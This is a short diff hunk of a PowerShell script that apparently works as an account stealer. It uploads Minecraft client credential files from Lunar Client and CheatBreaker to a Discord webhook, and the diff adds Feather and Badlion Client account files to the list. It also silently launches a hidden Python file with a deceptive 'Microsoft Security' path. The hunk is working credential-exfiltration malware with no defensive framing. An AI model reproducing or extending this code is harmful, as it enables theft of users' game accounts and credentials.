@@ -129,6 +129,8 @@ Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -M
 Start-Sleep -Seconds 2
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
+Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.feather\accounts.json"
+Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\Badlion Client\accounts.dat"
 Start-Process -FilePath "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\pythonw.exe" -ArgumentList "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py"
 #Pythonw.exe is like python.exe but with no windows (like silent start)
 ######################################################################
